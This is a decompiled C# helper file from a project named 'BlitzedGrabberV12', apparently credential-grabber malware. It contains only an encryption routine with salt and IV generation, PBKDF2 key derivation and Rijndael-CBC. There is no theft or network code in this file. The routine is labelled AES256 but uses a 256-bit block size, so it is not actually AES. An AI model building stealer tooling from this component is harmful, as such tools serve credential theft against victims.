using System;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;

namespace BlitzedGrabberV12.Helpers
{
	// Token: 0x02000006 RID: 6
	public static class AES256
	{
		// Token: 0x02000007 RID: 7
		public static class Encryptor
		{
			// Token: 0x0600001F RID: 31 RVA: 0x000022C8 File Offset: 0x000004C8
			public static byte[] Generate256BitsOfRandomEntropy()
			{
				byte[] array = new byte[32];
				using (RNGCryptoServiceProvider rngcryptoServiceProvider = new RNGCryptoServiceProvider())
				{
					rngcryptoServiceProvider.GetBytes(array);
				}
				return array;
			}

			// Token: 0x06000020 RID: 32 RVA: 0x00002308 File Offset: 0x00000508
			public static string Encrypt(string plainText, string passPhrase)
			{
				byte[] array = AES256.Encryptor.Generate256BitsOfRandomEntropy();
				byte[] array2 = AES256.Encryptor.Generate256BitsOfRandomEntropy();
				byte[] bytes = Encoding.UTF8.GetBytes(plainText);
				string result;
				using (Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passPhrase, array, 1000))
				{
					byte[] bytes2 = rfc2898DeriveBytes.GetBytes(32);
					using (RijndaelManaged rijndaelManaged = new RijndaelManaged())
					{
						rijndaelManaged.BlockSize = 256;
						rijndaelManaged.Mode = CipherMode.CBC;
						rijndaelManaged.Padding = PaddingMode.PKCS7;
						using (ICryptoTransform cryptoTransform = rijndaelManaged.CreateEncryptor(bytes2, array2))
						{
							using (MemoryStream memoryStream = new MemoryStream())
							{
								using (CryptoStream cryptoStream = new CryptoStream(memoryStream, cryptoTransform, CryptoStreamMode.Write))
								{
									cryptoStream.Write(bytes, 0, bytes.Length);
									cryptoStream.FlushFinalBlock();
									byte[] inArray = array.Concat(array2).ToArray<byte>().Concat(memoryStream.ToArray()).ToArray<byte>();
									memoryStream.Close();
									cryptoStream.Close();
									result = Convert.ToBase64String(inArray);
								}
							}
						}
					}
				}
				return result;
			}

			// Token: 0x04000005 RID: 5
			private const int Keysize = 256;

			// Token: 0x04000006 RID: 6
			private const int DerivationIterations = 1000;
		}
	}
}
